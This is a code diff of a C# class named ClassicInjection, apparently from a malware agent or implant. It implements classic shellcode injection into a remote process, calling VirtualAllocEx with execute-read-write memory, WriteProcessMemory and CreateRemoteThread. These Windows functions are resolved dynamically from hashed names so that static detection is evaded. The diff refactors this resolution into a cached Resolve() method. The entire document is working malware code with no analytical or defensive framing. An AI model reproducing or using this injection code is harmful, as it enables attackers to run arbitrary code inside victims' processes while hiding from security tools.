@@ -17,7 +17,11 @@ namespace Agent
         private delegate IntPtr VirtAllocExDelegate(IntPtr target, IntPtr lpAddress, UInt32 dwSize, Native.AllocationType flAllocationType, Native.MemoryProtection flProtect);
         private delegate bool WriteProcMemDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
         private delegate nint CrtDelegate(IntPtr target, IntPtr lpAddress, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, Native.ThreadCreationFlags dwCreationFlags, out IntPtr hThread);
-
+        private IntPtr k32Mod = IntPtr.Zero;
+        private IntPtr vaeFunc = IntPtr.Zero;
+        private IntPtr wpmFunc = IntPtr.Zero;
+        private IntPtr crtFunc = IntPtr.Zero;
+        public bool resolved { get; set; }
         private Dictionary<string, string> map = new Dictionary<string, string>()
         {
             { "crt","D2CF12547B8E0297710F0C1B7A6B8174" },
@@ -25,6 +29,41 @@ namespace Agent
             { "wpm", "A7592F86BEF17E2705EE75EFA81EF52B" },
             { "k32", "A63CBAF3BECF39638EEBC81A422A5D00" }
         };
+
+        public ClassicInjection()
+        {
+            k32Mod = Generic.GetLoadedModulePtr(map["k32"], key);
+            if (k32Mod == IntPtr.Zero)
+            {
+                resolved = false;
+                return;
+            }
+        }
+
+        public bool Resolve()
+        {
+            if (resolved)
+            {
+                return true;
+            }
+
+            k32Mod = Generic.GetLoadedModulePtr(map["k32"], key);
+            if (k32Mod == IntPtr.Zero)
+            {
+                resolved = false;
+                return false;
+            }
+            vaeFunc = Generic.GetExportAddr(k32Mod, map["vae"], key);
+            wpmFunc = Generic.GetExportAddr(k32Mod, map["wpm"], key);
+            crtFunc = Generic.GetExportAddr(k32Mod, map["crt"], key);
+
+            if(vaeFunc != IntPtr.Zero && wpmFunc != IntPtr.Zero && crtFunc != IntPtr.Zero)
+            {
+                resolved = true;
+            }
+
+            return resolved;
+        }
 
         public bool Inject(byte[] shellcode, IntPtr hTarget)
         {
@@ -38,65 +77,38 @@ namespace Agent
 
         private bool Run(IntPtr target, byte[] shellcode)
         {
-            ///////////////////// Kernel32 /////////////////////
-            var k32Mod = Generic.GetLoadedModuleAddress(map["k32"], key);
-
-            if(k32Mod == IntPtr.Zero)
-            {
-                return false;
-            }
-            ///////////////////// Kernel32 /////////////////////
-            //////////////////////// VirtualAllocEx /////////////////////
-            var pFunc = Generic.GetExportAddress(k32Mod, map["vae"], key);
-            
-            if(pFunc == IntPtr.Zero)
+            if (!this.resolved)
             {
                 return false;
             }
 
-            //IntPtr pAddr = Native.VirtualAllocEx(target, IntPtr.Zero, (UInt32)shellcode.Length, Native.AllocationType.Commit | Native.AllocationType.Reserve, Native.MemoryProtection.PAGE_EXECUTE_READWRITE);
+            //VirtualAllocEx
             object[] vaeParams = new object[] { target, IntPtr.Zero, (UInt32)shellcode.Length, Native.AllocationType.Commit | Native.AllocationType.Reserve, Native.MemoryProtection.PAGE_EXECUTE_READWRITE };
-            IntPtr pAddr = Generic.DynamicFunctionInvoke<IntPtr>(pFunc, typeof(VirtAllocExDelegate), ref vaeParams);
+            IntPtr pAddr = Generic.InvokeFunc<IntPtr>(vaeFunc, typeof(VirtAllocExDelegate), ref vaeParams);
             
             if (pAddr == IntPtr.Zero)
             {
                 return false;
             }
-            ///////////////////// VirtualAllocEx /////////////////////
-            
-            //////////////////////// WriteProcessMemory /////////////////////
-            var pFunc2 = Generic.GetExportAddress(k32Mod, map["wpm"], key);
-            if (pFunc2 == IntPtr.Zero)
-            {
-                return false;
-            }
 
+            //WriteProcessMemory
             IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
             object[] wpmParams = new object[] { target, pAddr, shellcode, shellcode.Length, lpNumberOfBytesWritten };
 
-            if (!Generic.DynamicFunctionInvoke<bool>(pFunc2, typeof(WriteProcMemDelegate), ref wpmParams))
-            {
-                return false;
-            }
-            //////////////////////// WriteProcessMemory /////////////////////
-            
-            //////////////////////// CreateRemoteThread /////////////////////
-            var pFunc3 = Generic.GetExportAddress(k32Mod, map["crt"], key);
-
-            if(pFunc3 == IntPtr.Zero)
+            if (!Generic.InvokeFunc<bool>(wpmFunc, typeof(WriteProcMemDelegate), ref wpmParams))
             {
                 return false;
             }
 
+            //CreateRemoteThread
             IntPtr hThreadId = IntPtr.Zero;
             object[] crtParams = new object[] { target, IntPtr.Zero, (UInt32)0, pAddr, IntPtr.Zero, Native.ThreadCreationFlags.NORMAL, hThreadId };
-            IntPtr hThread = Generic.DynamicFunctionInvoke<nint>(pFunc3, typeof(CrtDelegate), ref crtParams);
+            IntPtr hThread = Generic.InvokeFunc<nint>(crtFunc, typeof(CrtDelegate), ref crtParams);
 
             if (hThread == IntPtr.Zero)
             {
                 return false;
             }
-            //////////////////////// CreateRemoteThread /////////////////////
             return true;
         }
     }
